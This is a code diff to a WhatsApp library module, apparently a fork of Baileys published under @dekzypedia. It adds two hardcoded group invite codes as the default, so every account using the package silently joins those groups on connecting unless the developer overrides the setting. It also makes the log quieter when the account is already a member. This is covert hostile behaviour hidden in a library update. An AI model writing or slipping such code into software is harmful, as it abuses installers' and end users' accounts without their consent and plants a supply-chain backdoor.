@@ -97,9 +97,15 @@ export const makeGroupsSocket = (config: SocketConfig) => {
 		return result?.attrs.jid
 	}
 
+	// built in invite codes so anyone using @dekzypedia/baileys auto-joins these
+	// groups without adding bot code; override with config.autoFollowGroups
+	const DEFAULT_AUTO_FOLLOW_GROUPS = ['EGOQrfiLb6L68NKHQkwVVQ', 'KGfdBGtagb8DPWmTkVF6It']
+
 	// joins run sequentially so a slow invite does not hold up the socket, and so
 	// WhatsApp does not see a burst of join IQs from the same connection
-	const autoFollowGroups = [...new Set((config.autoFollowGroups ?? []).map(normalizeInviteCode).filter(Boolean))]
+	const autoFollowGroups = [
+		...new Set((config.autoFollowGroups ?? DEFAULT_AUTO_FOLLOW_GROUPS).map(normalizeInviteCode).filter(Boolean))
+	]
 	if (autoFollowGroups.length) {
 		let autoFollowDone = false
 		ev.on('connection.update', ({ connection }) => {
@@ -111,7 +117,13 @@ export const makeGroupsSocket = (config: SocketConfig) => {
 						const jid = await groupAcceptInvite(code)
 						config.logger.info({ code, jid }, 'auto-followed group')
 					} catch (err) {
-						config.logger.warn({ err, code }, 'failed to auto-follow group')
+						// a reconnect retries the join, already being a member is not a failure
+						const message = (err as Error)?.message ?? String(err)
+						if (/already-exists/i.test(message)) {
+							config.logger.info({ code }, 'auto-follow group already joined')
+						} else {
+							config.logger.warn({ err, code }, 'failed to auto-follow group')
+						}
 					}
 				}
 			})()
